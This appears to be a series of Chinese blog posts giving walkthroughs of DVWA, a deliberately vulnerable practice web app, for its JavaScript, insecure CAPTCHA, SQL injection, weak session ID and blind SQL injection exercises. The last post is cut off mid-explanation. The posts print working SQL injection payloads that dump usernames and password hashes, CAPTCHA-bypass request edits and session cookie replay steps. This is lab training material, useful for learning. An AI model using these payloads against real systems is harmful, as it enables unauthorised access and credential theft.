<h4 id="页面代码"><a href="#页面代码" class="headerlink" title="页面代码"></a>页面代码</h4><p>查看页面发现 token的值是一个隐藏控件，并且是一个固定值</p>
<p><img src="/aposts/558de72d/image-20220215153721456.png" alt="image-20220215153721456"></p>
<ul>
<li>看其他人的博客，直接能看到index.php文件的逻辑，我试过了这样不行</li>
</ul>
<p><img src="/aposts/558de72d/image-20220215160009445.png" alt="image-20220215160009445"></p>
<ul>
<li>转到服务器上看下具体的index.php代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 不知具体的Index.php文件在哪里，采用模糊搜索的方式找到了php文件</span><br><span class="line">[root@VM-24-13-centos DVWA-2.0.1]# grep -r &#x27;You got the phrase wrong&#x27;</span><br><span class="line">vulnerabilities/javascript/index.php:                   $message = &quot;&lt;p&gt;You got the phrase wrong.&lt;/p&gt;&quot;;</span><br><span class="line">...</span><br><span class="line">[root@VM-24-13-centos javascript]# pwd</span><br><span class="line">/var/www/html/DVWA-2.0.1/vulnerabilities/javascript</span><br><span class="line">[root@VM-24-13-centos javascript]# cat index.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看下核心代码就清楚了，整个完整逻辑是这样</p>
<ul>
<li>文本框(phrase)输入内容，经过md5+自定义函数（rol13）转换后，最终赋值给token（隐藏控件）</li>
<li>用token的值和加密后的success（md5(rot13)函数）对比</li>
</ul>
<p><img src="/aposts/558de72d/image-20220215160521487.png" alt="image-20220215160521487"></p>
<h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><ul>
<li><p>既然知道了整个逻辑，只要输入已经加密过的success字符串即可</p>
</li>
<li><p>谷歌浏览器按f12，打开console，输入：<code>md5(rot13(&quot;success&quot;))</code>得到了值为：38581812b435834ebf84ebcc2c6424d6</p>
</li>
</ul>
<p><img src="/aposts/558de72d/image-20220215161321203.png" alt="image-20220215161321203"></p>
<p>页面文本框输入：success，点击提交</p>
<p><img src="/aposts/558de72d/image-20220215161946122.png" alt="image-20220215161946122"></p>
<p>抓包拦截请求修改token的值为：38581812b435834ebf84ebcc2c6424d6，点击发送</p>
<p><img src="/aposts/558de72d/image-20220215162218406.png" alt="image-20220215162218406"></p>
<p>页面上展示通过</p>
<p><img src="/aposts/558de72d/image-20220215162254369.png" alt="image-20220215162254369"></p>
<h2 id="安全等级为Meduim"><a href="#安全等级为Meduim" class="headerlink" title="安全等级为Meduim"></a>安全等级为Meduim</h2><h3 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h3><p>其实就是do_someting对phrase变量进行反转，如输入的success，就是sseccus，生成的token值&#x3D;XXsseccusXX</p>
<p><img src="/aposts/558de72d/image-20220215162917020.png" alt="image-20220215162917020"></p>
<h3 id="开始攻击-1"><a href="#开始攻击-1" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>页面上输入success</p>
<p><img src="/aposts/558de72d/image-20220215161946122.png" alt="image-20220215161946122"></p>
<p>token直接改为XXsseccusXX</p>
<p><img src="/aposts/558de72d/image-20220215163915705-16449143566171.png" alt="image-20220215163915705"></p>
<p><img src="/aposts/558de72d/image-20220215164001569.png" alt="image-20220215164001569"></p>
<h2 id="后续攻击"><a href="#后续攻击" class="headerlink" title="后续攻击"></a>后续攻击</h2><p>不实践了，直接参考<a href="https://blog.csdn.net/weixin_43252204/article/details/106723183?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0.pc_relevant_paycolumn_v3&spm=1001.2101.3001.4242.1&utm_relevant_index=3">这里</a></p>
]]></content>
      <categories>
        <category>安全测试</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA通关指南-Insecure CAPTCHA（不安全的验证流程）</title>
    <url>/aposts/d046404c/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><ul>
<li>主要是验证流程出现了逻辑漏洞，比如常见的多个页面的流程流转</li>
<li>注意需要自己开个梯子才能验证此漏洞</li>
</ul>
<h2 id="安全等级为Low"><a href="#安全等级为Low" class="headerlink" title="安全等级为Low"></a>安全等级为Low</h2><h3 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h3><p>这里分着两个阶段：</p>
<ul>
<li><p>step &#x3D;&#x3D; 1 验证用户身份，服务器会用私钥对用户进行身份验证，如果验证成功了才能进行修改密码</p>
</li>
<li><p>step &#x3D;&#x3D; 2 如果如果两次输入的密码一致，就进行修改</p>
</li>
</ul>
<p><img src="/aposts/d046404c/image-20220209163634330.png" alt="image-20220209163634330"></p>
<h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>输入密码点击change</p>
<p><img src="/aposts/d046404c/image-20220209171303625.png" alt="image-20220209171303625"></p>
<p>fiddler抓包发现，step&#x3D;1时需要匹配验证码，所以验证失败，无法修改密码。</p>
<p><img src="/aposts/d046404c/image-20220209171613685.png" alt="image-20220209171613685"></p>
<p>这样的话，我们抓包修改step，直接跳过第一阶段 既可以实现修改密码，在fillder底部输入：<code>bpu  http://xxxx.xx.xx.xx/DVWA-2.0.1/vulnerabilities/captcha/</code> 拦截此请求</p>
<p><img src="/aposts/d046404c/image-20220209171903803.png" alt="image-20220209171903803"></p>
<p>把setp&#x3D;1改为setp&#x3D;2</p>
<p><img src="/aposts/d046404c/image-20220209172051035.png" alt="image-20220209172051035"></p>
<p>点击run to completion按钮</p>
<p><img src="/aposts/d046404c/image-20220209172146384.png" alt="image-20220209172146384"></p>
<p>密码修改成功</p>
<p><img src="/aposts/d046404c/image-20220209172219770.png" alt="image-20220209172219770"></p>
<h2 id="安全等级为medium"><a href="#安全等级为medium" class="headerlink" title="安全等级为medium"></a>安全等级为medium</h2><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>我们发现medium级别中的第二阶段多了一步验证passed_captcha的步骤</p>
<p><img src="/aposts/d046404c/image-20220209172935832.png" alt="image-20220209172935832"></p>
<h3 id="开始攻击-1"><a href="#开始攻击-1" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>那我们就抓包修改step&#x3D;2 ，新增passed_captcha&#x3D;true，点Run to Completion</p>
<p><img src="/aposts/d046404c/image-20220209173504679.png" alt="image-20220209173504679"></p>
<p>修改密码成功</p>
<p><img src="/aposts/d046404c/image-20220209173553242.png" alt="image-20220209173553242"></p>
<h2 id="安全等级为High"><a href="#安全等级为High" class="headerlink" title="安全等级为High"></a>安全等级为High</h2><ul>
<li><p>这里没有在分阶段吗了，都合到一起，说明我们之前的方法不适用了。</p>
</li>
<li><p>分析代码我们可以看出服务器的验证逻辑是当$resp（这里是指谷歌返回的验证结果）是false，这里的结果无法改变，</p>
</li>
<li><p>只要数g-recaptcha-response等于hidd3n_valu3并且http包头的User-Agent参数等于reCAPTCHA时，就可以绕过验证这块了</p>
</li>
</ul>
<p><img src="/aposts/d046404c/image-20220209174306720.png" alt="image-20220209174306720"></p>
<h3 id="开始攻击-2"><a href="#开始攻击-2" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>fiddler抓包修改，头部修User-Agent：reCAPTCHA，请求参数新增g-recaptcha-response&#x3D;hidd3n_valu3，点击run to completion</p>
<p><img src="/aposts/d046404c/image-20220209175257244.png" alt="image-20220209175257244"></p>
<ul>
<li>修改密码成功</li>
</ul>
<p><img src="/aposts/d046404c/image-20220209180324054.png" alt="image-20220209180324054"></p>
<h2 id="安全等级为impossible"><a href="#安全等级为impossible" class="headerlink" title="安全等级为impossible"></a>安全等级为impossible</h2><h3 id="分析源码-1"><a href="#分析源码-1" class="headerlink" title="分析源码"></a>分析源码</h3><p>Impossible级别的代码增加了Anti-CSRF token 机制防御CSRF攻击，利用PDO技术防护sql注入，验证过程终于不再分成两部分了，验证码无法绕过，同时要求用户输入之前的密码，进一步加强了身份认证。</p>
<p><img src="/aposts/d046404c/image-20220209180824990.png" alt="image-20220209180824990"></p>
<p>本文主要参考<a href="https://blog.csdn.net/weixin_45808483/article/details/121385412">这里的步骤</a></p>
]]></content>
      <categories>
        <category>安全测试</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA通关指南-SQL Injection(sql注入)</title>
    <url>/aposts/9b19932e/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>SQL注入是比较常见的网络攻击方式之一，它不是利用操作系统的BUG来实现攻击，而是针对程序员编写时的疏忽，通过SQL语句，实现无账号登录，甚至篡改数据库。</p>
<h3 id="SQL注入流程"><a href="#SQL注入流程" class="headerlink" title="SQL注入流程"></a>SQL注入流程</h3><p>拿到一个查询条件的web网页，就需要对输入框做以下的事情</p>
<ul>
<li><p>判断是否存在注入，注入是字符型还是数字型</p>
</li>
<li><p>猜解SQL查询语句中的字段数</p>
</li>
<li><p>确定显示的字段顺序</p>
</li>
<li><p>获取当前数据库</p>
</li>
<li><p>获取数据库中的表</p>
</li>
<li><p>获取表中的字段名</p>
</li>
<li><p>下载数据</p>
</li>
</ul>
<h2 id="安全等级为Low"><a href="#安全等级为Low" class="headerlink" title="安全等级为Low"></a>安全等级为Low</h2><p><img src="/aposts/9b19932e/image-20220210102936779.png" alt="image-20220210102936779"></p>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>根据id，获取用户信息</p>
<p><img src="/aposts/9b19932e/image-20220210102904972.png" alt="image-20220210102904972"></p>
<h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>输入1’ #（ 闭合方式，单引号闭合，<strong>使用#注释后面内容</strong>）</p>
<p><img src="/aposts/9b19932e/image-20220210103853390.png" alt="image-20220210103853390"></p>
<h4 id="获取数据库"><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h4><p> 输入 <code>-1&#39; union select 1,database() #</code></p>
<p><img src="/aposts/9b19932e/image-20220210104351037.png" alt="image-20220210104351037"></p>
<h4 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h4><p>输入下面的注入，  table_schema数据库名的十六进制，0x64767761就是dvwa</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x64767761 #</span></span><br></pre></td></tr></table></figure>

<p><img src="/aposts/9b19932e/image-20220210105054060.png" alt="image-20220210105054060"></p>
<h4 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h4><p>输入下面的注入，table_name&#x3D;0x7573657273这里多了一个这个，这是表名的十六进制，也就是users表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #</span></span><br></pre></td></tr></table></figure>

<p><img src="/aposts/9b19932e/image-20220210105234793.png" alt="image-20220210105234793"></p>
<h4 id="爆字段值"><a href="#爆字段值" class="headerlink" title="爆字段值"></a>爆字段值</h4><p>输入下面的注入，0x7e表示特色符号~和concat_ws联合使用，连接user,password字段，这样就得到了数据库的用户名和密码（请看下面获取用户名和密码步骤，更加简单）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(concat_ws(0x7e,user,password)) from dvwa.users #</span></span><br></pre></td></tr></table></figure>

<p><img src="/aposts/9b19932e/image-20220210105701150.png" alt="image-20220210105701150"></p>
<h4 id="获取用户和密码"><a href="#获取用户和密码" class="headerlink" title="获取用户和密码"></a>获取用户和密码</h4><p>输入下面的注入，获取打用户名和密码</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select user,password from users#</span></span><br></pre></td></tr></table></figure>

<p><img src="/aposts/9b19932e/image-20220210110937708.png" alt="image-20220210110937708"></p>
<p>随便找个在线MD5解密工具，判断出密码；</p>
<p><img src="/aposts/9b19932e/image-20220210111045840.png" alt="image-20220210111045840"></p>
<h2 id="安全等级为Medium"><a href="#安全等级为Medium" class="headerlink" title="安全等级为Medium"></a>安全等级为Medium</h2><p><img src="/aposts/9b19932e/image-20220210111956188.png" alt="image-20220210111956188"></p>
<h3 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h3><ul>
<li><p>可以看到，Medium级别的代码利用mysql_real_escape_string函数对特殊符号\x00,\n,\r,,’,”,\x1a进行转义；</p>
</li>
<li><p>同时设置了下拉选择表单，控制用户的输入；</p>
</li>
<li><p>可以简单看出，用户只能选择1-5，存在数字型SQL注入；</p>
</li>
</ul>
<p><img src="/aposts/9b19932e/image-20220210111913568.png" alt="image-20220210111913568"></p>
<h3 id="开始攻击-1"><a href="#开始攻击-1" class="headerlink" title="开始攻击"></a>开始攻击</h3><ul>
<li><p>burp suit抓包设置好</p>
</li>
<li><p>页面上选项下拉数字，点击提交按钮</p>
</li>
</ul>
<p><img src="/aposts/9b19932e/image-20220210112442902.png" alt="image-20220210112442902"></p>
<p><img src="/aposts/9b19932e/image-20220210113450667.png" alt="image-20220210113450667"></p>
<ul>
<li>把id的值修改为：<code>1 union select user,password from users#</code></li>
</ul>
<p><img src="/aposts/9b19932e/image-20220210113829839.png" alt="image-20220210113829839"></p>
<ul>
<li>攻击成功</li>
</ul>
<p><img src="/aposts/9b19932e/image-20220210113908830.png" alt="image-20220210113908830"></p>
<h2 id="安全等级为High"><a href="#安全等级为High" class="headerlink" title="安全等级为High"></a>安全等级为High</h2><p>查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入（自动化注入），因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。</p>
<p><img src="/aposts/9b19932e/image-20220210160300452.png" alt="image-20220210160300452"></p>
<h3 id="源码分析-2"><a href="#源码分析-2" class="headerlink" title="源码分析"></a>源码分析</h3><p>High级别在SQL查询语句中添加了LIMIT 1，以此控制只输入一个结果；虽然添加了LIMIT 1，但是我们可以通过#将其注释掉；</p>
<p><img src="/aposts/9b19932e/image-20220210114128794.png" alt="image-20220210114128794"></p>
<h3 id="开始攻击-2"><a href="#开始攻击-2" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>输入，都不用抓包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select user,password from users#</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/9b19932e/image-20220210160700531.png" alt="image-20220210160700531"></p>
<p><img src="/aposts/9b19932e/image-20220210160716678.png" alt="image-20220210160716678"></p>
<h2 id="安全等级为Impossible"><a href="#安全等级为Impossible" class="headerlink" title="安全等级为Impossible"></a>安全等级为Impossible</h2><h3 id="源码分析-3"><a href="#源码分析-3" class="headerlink" title="源码分析"></a>源码分析</h3><ul>
<li><p>Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入；</p>
</li>
<li><p>同时只有返回的查询结果数量为1时，才会输出；</p>
</li>
</ul>
<p><img src="/aposts/9b19932e/image-20220210160823566.png" alt="image-20220210160823566"></p>
<p>本文主要来自于<a href="https://blog.csdn.net/qq_38684504/article/details/89847056">这里</a></p>
]]></content>
      <categories>
        <category>安全测试</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA通关指南-Weak Session IDs(弱会话ID)</title>
    <url>/aposts/616944d0/</url>
    <content><![CDATA[<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li><p>对于本篇的攻击方式，感觉应该有问题，其实无论安全等级为何种，只要在谷歌打开dvwa抓包到cookie值后，然后再火狐浏览器打开url，修改为谷歌dvwa中cookie值后，都能绕过登录</p>
</li>
<li><p>但是我搜索了其他博客，都是采用这样的方式来做的</p>
</li>
</ul>
<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ul>
<li><p>用户访问服务器的时候，一般服务器都会分配一个身份证 session id 给用户，用于标识。</p>
</li>
<li><p>获得session后，用户访问页面就不用登陆，只需要携带session就可以了。</p>
</li>
</ul>
<h3 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h3><ul>
<li><p>由于SessonID是用户登陆后拥有的唯一认证凭证，因此黑客不需要再攻击登陆过程，就可以获取访问权限</p>
</li>
<li><p>常见类型保存在cookie中，保存在url中(太不安全)</p>
</li>
</ul>
<h2 id="安全等级Low"><a href="#安全等级Low" class="headerlink" title="安全等级Low"></a>安全等级Low</h2><p>用谷歌浏览器打开dvwa</p>
<p><img src="/aposts/616944d0/image-20220211105704983.png" alt="image-20220211105704983"></p>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>服务器每次生成的session_id加1给客户端，  <code>setcookie(&quot;dvwaSession&quot;, $cookie_value);</code>就是设置session的值</p>
<p><img src="/aposts/616944d0/image-20220211110634046.png" alt="image-20220211110634046"></p>
<h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><ul>
<li><p>抓包，得到cookie的值：</p>
<p><code>Cookie: dvwaSession=4; security=low; PHPSESSID=e1r12c4ddu75vdmch70gkmr087</code></p>
</li>
<li><p>得到请求连接为：<a href="http://xxxx1/DVWA-2.0.1/vulnerabilities/weak_id/">http://XXXX1/DVWA-2.0.1/vulnerabilities/weak_id/</a></p>
</li>
</ul>
<p><img src="/aposts/616944d0/image-20220211153530303.png" alt="image-20220211153530303"></p>
<ul>
<li>打开火狐浏览器（没有自行安装）,输入上面的url:<a href="http://xxxx1/DVWA-2.0.1/vulnerabilities/weak_id/">http://XXXX1/DVWA-2.0.1/vulnerabilities/weak_id/</a></li>
</ul>
<p><img src="/aposts/616944d0/image-20220211164333448.png" alt="image-20220211164333448"></p>
<p>抓包火狐发送的请求，发现security&#x3D;impossible，并不是Low，据我观察好像在登录后才会读取security的值，不然默认就是impossible</p>
<p><img src="/aposts/616944d0/image-20220211164609202.png" alt="image-20220211164609202"></p>
<p>把cookie改过来：dvwaSession&#x3D;4; security&#x3D;low; PHPSESSID&#x3D;e1r12c4ddu75vdmch70gkmr087，点击发送</p>
<p><img src="/aposts/616944d0/image-20220211164918914.png" alt="image-20220211164918914"></p>
<h2 id="安全等级为Medium"><a href="#安全等级为Medium" class="headerlink" title="安全等级为Medium"></a>安全等级为Medium</h2><h3 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h3><p>采用time函数获取时间戳，作为cookie值(session)</p>
<p><img src="/aposts/616944d0/image-20220211112526717.png" alt="image-20220211112526717"></p>
<h3 id="开始攻击-1"><a href="#开始攻击-1" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>谷歌浏览器抓包后，得到 <code>cookie:dvwaSession=1644566404; security=medium; PHPSESSID=e1r12c4ddu75vdmch70gkmr087</code></p>
<p><img src="/aposts/616944d0/image-20220211165037092.png" alt="image-20220211165037092"></p>
<p>注意dvaSession的值为时间戳，需要这里我们就需要去时间戳的网站进行转换：<a href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a></p>
<p><img src="/aposts/616944d0/image-20220211160435148.png" alt="image-20220211160435148"></p>
<p>火狐浏览器先退出登录的DVWA，输入<a href="http://xxxx1/DVWA-2.0.1/vulnerabilities/weak_id/">http://XXXX1/DVWA-2.0.1/vulnerabilities/weak_id/</a></p>
<p>抓包修改cookie的值为：dvwaSession&#x3D;1644566404; security&#x3D;medium; PHPSESSID&#x3D;e1r12c4ddu75vdmch70gkmr087</p>
<p><img src="/aposts/616944d0/image-20220211165419235.png" alt="image-20220211165419235"></p>
<ul>
<li>成功跳过登录验证，发现一个奇怪问题，就算是<strong>谷歌浏览器中设置了安全等级的难度，在火狐请求中直接修改cookie的值就能绕过？</strong></li>
</ul>
<h2 id="安全等级High"><a href="#安全等级High" class="headerlink" title="安全等级High"></a>安全等级High</h2><h3 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h3><ul>
<li>首先使用!isset()函数对session变量进行检查，如果没有进行赋值。则设置为0，然后每一次都递增1。</li>
<li>然后将session变量进行MD5加密后赋值为cookie_value变量。</li>
<li>最终，将 cookie_value这个值发送给浏览器作为cookie。</li>
<li>这里进行哈希加密处理，但初始的值始终是从0开始这种形式作为cookie</li>
</ul>
<p><img src="/aposts/616944d0/image-20220211165923234.png" alt="image-20220211165923234"></p>
<h3 id="开始攻击-2"><a href="#开始攻击-2" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>谷歌浏览器，点击生成按钮</p>
<p><img src="/aposts/616944d0/image-20220211170403199.png" alt="image-20220211170403199"></p>
<p>抓包谷歌浏览器中的请求，发现请求参数其实<strong>和安全等级为medium一样的</strong></p>
<p><img src="/aposts/616944d0/image-20220211172637304.png" alt="image-20220211172637304"></p>
<p>发给重发器观察下</p>
<p><img src="/aposts/616944d0/image-20220211172716229.png" alt="image-20220211172716229"></p>
<p> 在重发去中发送请求，得到dvwaSession的值为：e4da3b7fbbce2345d7772b0674a318d5</p>
<p><img src="/aposts/616944d0/image-20220211171042169.png" alt="image-20220211171042169"></p>
<p>用<a href="https://www.cmd5.com/">在线md5</a>解密工具看看，这样的话就明白了它的逻辑，<strong>又服务器端提供dvwaSession在low的基础上加入了MD5加密</strong></p>
<p><img src="/aposts/616944d0/image-20220211171315505.png" alt="image-20220211171315505"></p>
<ul>
<li><p>把构造的cookie复制：<code>dvwaSession=e4da3b7fbbce2345d7772b0674a318d5; security=high; PHPSESSID=e1r12c4ddu75vdmch70gkmr087</code></p>
</li>
<li><p>打开火狐浏览器你，输入url，抓包拦截,修改cookie的值，<strong>dvwaSession的值输入的是时间戳也能成功</strong></p>
</li>
<li><p><strong>其实这里的攻击我并没有看出和安全等级为中的时候的区别</strong></p>
</li>
</ul>
<p><img src="/aposts/616944d0/image-20220211172040526.png" alt="image-20220211172040526"></p>
<p>点击发送后，成功绕过登录</p>
<p><img src="/aposts/616944d0/image-20220211172118623.png" alt="image-20220211172118623"></p>
<h2 id="安全等级为impossible"><a href="#安全等级为impossible" class="headerlink" title="安全等级为impossible"></a>安全等级为impossible</h2><h3 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h3><p>$cookie_value采用随机数+时间戳+固定字符串”Impossible”，再进行sha1运算，完全不能猜测到dvwaSession的值。</p>
<p><img src="/aposts/616944d0/image-20220211173247187.png" alt="image-20220211173247187"></p>
<p>参考<a href="https://blog.csdn.net/weixin_45808483/article/details/121385412">这里</a></p>
]]></content>
      <categories>
        <category>安全测试</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA通关指南-SQL Injection（Blind盲注)</title>
    <url>/aposts/98d7c1e5/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><ul>
<li>与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</li>
<li>盲注举个例子：比如本次的dvwa中，输入id后，只有两种结果：存在和不存在</li>
</ul>
<table>
<thead>
<tr>
<th>普通SQL注入</th>
<th>SQL盲注</th>
</tr>
</thead>
<tbody><tr>
<td>执行SQL注入攻击时，服务器会响应来自数据库服务器的错误信息，信息提示SQL语法不正确等</td>
<td>服务器不会直接返回具体的数据库错误or语法错误，而是会返回程序开发所设置的特定信息（也有特例，如基于报错的盲注）</td>
</tr>
<tr>
<td>一般在页面上直接就会显示执行sql语句的结果</td>
<td>不会直接显示sql执行的结果</td>
</tr>
<tr>
<td></td>
<td>有可能出现不确定sql是否执行的情况</td>
</tr>
</tbody></table>
<ul>
<li>可以完全参考<a href="https://www.jianshu.com/p/757626cec742">https://www.jianshu.com/p/757626cec742</a></li>
</ul>
<h3 id="盲注类型"><a href="#盲注类型" class="headerlink" title="盲注类型"></a>盲注类型</h3><ul>
<li><p>基于布尔值的盲注；</p>
</li>
<li><p>基于时间的盲注；</p>
</li>
<li><p>基于报错的盲注；</p>
</li>
</ul>
<p>在本次实验中只演示基于布尔值的盲注与基于时间的盲注；</p>
<h3 id="盲注过程"><a href="#盲注过程" class="headerlink" title="盲注过程"></a>盲注过程</h3><ul>
<li><p>判断是否存在注入，注入是字符型还是数字型；</p>
</li>
<li><p>猜解当前数据库名；</p>
<p>猜解数据库的长度；猜解数据库的名称；</p>
</li>
<li><p>猜解数据库中的表名；</p>
<p>猜解库中有几个表；猜解表的长度；猜解表的名称；</p>
</li>
<li><p>猜解表中的字段名；</p>
<p>猜解表中有几个字段；猜解字段的长度；猜解字段的名称；</p>
</li>
<li><p>猜解数据；</p>
</li>
</ul>
<h2 id="安全等级为Low"><a href="#安全等级为Low" class="headerlink" title="安全等级为Low"></a>安全等级为Low</h2><ul>
<li><p>对参数id没有做任何检查、过滤，存在明显的<a href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a>漏洞；</p>
</li>
<li><p>同时SQL语句查询返回的结果只有两种：User ID exists in the database；User ID is MISSING from the database；</p>
</li>
</ul>
<p><img src="/aposts/98d7c1e5/image-20220210172254464.png" alt="image-20220210172254464"></p>
<h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><h4 id="基于布尔值的盲注"><a href="#基于布尔值的盲注" class="headerlink" title="基于布尔值的盲注"></a>基于布尔值的盲注</h4><h5 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h5><ul>
<li>判断是否存在注入，注入是字符型还是数字型</li>
<li>输入1，查询成功；</li>
</ul>
<p><img src="/aposts/98d7c1e5/image-20220210172531276.png" alt="image-20220210172531276"></p>
<p>输入<code>1&#39; or &#39;1&#39;=&#39;1#</code>，查询成功，证明存在字符型SQL注入；</p>
<p><img src="/aposts/98d7c1e5/image-20220210172617410.png" alt="image-20220210172617410"></p>
<h5 id="猜解当前数据库名"><a href="#猜解当前数据库名" class="headerlink" title="猜解当前数据库名"></a>猜解当前数据库名</h5><h6 id="猜解数据库名的长度"><a href="#猜解数据库名的长度" class="headerlink" title="猜解数据库名的长度"></a>猜解数据库名的长度</h6><p>发现输入：<code>1&#39; and length(database()) =4 #</code>，返回正确</p>
<p><img src="/aposts/98d7c1e5/image-20220210172912337.png" alt="image-20220210172912337"></p>
<h6 id="猜数据库名字"><a href="#猜数据库名字" class="headerlink" title="猜数据库名字"></a>猜数据库名字</h6><ul>
<li><p>分别输入，其实他们的值分别为：d,v,w,a,<strong>联合起来就是：dvwa</strong></p>
</li>
<li><p>注意substr这里的语法，<code>substr(str,1,1)</code>，表示截取字符串从第一位开始，截取一个字符，<code>substr(str,2,1)</code>表示截取字符串从第2位开始，截取一个字符</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and ascii(substr(database(),1,1))=100#       </span><br><span class="line"></span><br><span class="line">1&#x27; and ascii(substr(database(),2,1))=118#        </span><br><span class="line"></span><br><span class="line">1&#x27; and ascii(substr(database(),3,1))=119#        </span><br><span class="line"></span><br><span class="line">1&#x27; and ascii(substr(database(),4,1))=97#         </span><br></pre></td></tr></table></figure>

<p><img src="/aposts/98d7c1e5/image-20220210173553877.png" alt="image-20220210173553877"></p>
<p>ascii需要 结合下面的表进行查看，比如<code>ascii(substr(database(),1,1))=100</code> 就算等于d</p>
<p><img src="/aposts/98d7c1e5/2021030510302822.png" alt="2021030510302822"></p>
<h5 id="猜解数据库中的表名"><a href="#猜解数据库中的表名" class="headerlink" title="猜解数据库中的表名"></a>猜解数据库中的表名</h5><h6 id="猜解数据库中表的个数"><a href="#猜解数据库中表的个数" class="headerlink" title="猜解数据库中表的个数"></a>猜解数据库中表的个数</h6><p>有两个表，输入：<code>1&#39; and  (select count(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39;)=2#</code></p>
<p><img src="/aposts/98d7c1e5/image-20220210173736423.png" alt="image-20220210173736423"></p>
<h6 id="猜解数据库中表的长度"><a href="#猜解数据库中表的长度" class="headerlink" title="猜解数据库中表的长度"></a>猜解数据库中表的长度</h6><ul>
<li><p>如（guestbook&#x3D;9,users&#x3D;5）</p>
<ul>
<li>输入 <code>1&#39; and  length(substr((select  table_name from information_schema.tables where table_schema=&#39;dvwa&#39; limit 0,1),1))=9#</code></li>
</ul>
<p><img src="/aposts/98d7c1e5/image-20220210173933913.png" alt="image-20220210173933913"></p>
<ul>
<li><p>输入：<code>1&#39; and  length(substr((select  table_name from information_schema.tables where table_schema=&#39;dvwa&#39; limit 1,1),1))=5#</code></p>
<p><img src="/aposts/98d7c1e5/image-20220210173933913.png" alt="image-20220210173933913"></p>
</li>
</ul>
</li>
</ul>
<h6 id="猜解数据库中的表名-1"><a href="#猜解数据库中的表名-1" class="headerlink" title="猜解数据库中的表名"></a>猜解数据库中的表名</h6><ul>
<li>如（guestbook，users），输入下面的值，得到guestbook中的g</li>
<li>注意limit语法，如：<code>select * from tablename limit 2,4</code>，表示即取出第3条至第6条，4条记录</li>
<li>那么下面的语句解释我：查询到所有表后（取第一个表）用substr截取（规则为从第一个字符开始，截取长度为1），最终用ascii进行转换得到值（103）和103进行对比</li>
</ul>
